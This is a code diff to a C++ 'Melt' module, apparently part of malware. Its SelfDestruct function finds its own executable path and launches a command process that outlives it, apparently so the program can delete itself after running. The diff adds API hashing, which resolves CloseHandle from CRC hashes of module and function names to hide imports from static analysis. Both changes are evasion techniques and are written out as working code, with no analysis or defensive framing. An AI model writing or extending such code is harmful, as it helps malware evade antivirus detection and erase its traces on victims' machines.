@@ -9,12 +9,21 @@
 // 
 
 #include "Melt.h"
+#include "ApiResolver.h"
 #include <string>
 
 namespace Melt
 {
     void SelfDestruct()
     {
+        // Динамическое разрешение CloseHandle
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return;
+
+        typedef BOOL (WINAPI* pfnCloseHandle)(HANDLE);
+        pfnCloseHandle pCloseHandle = (pfnCloseHandle)Api::GetProcByHashCrc(hK32, Api::CrcFn::CloseHandle);
+        if (!pCloseHandle) return;
+
         // Get path to ourselves
         wchar_t selfPath[MAX_PATH];
         GetModuleFileNameW(NULL, selfPath, MAX_PATH);
@@ -41,7 +50,7 @@ namespace Melt
         );
 
         // Close handles immediately, the cmd process will outlive us
-        if (pi.hProcess) CloseHandle(pi.hProcess);
-        if (pi.hThread) CloseHandle(pi.hThread);
+        if (pi.hProcess) pCloseHandle(pi.hProcess);
+        if (pi.hThread) pCloseHandle(pi.hThread);
     }
 }
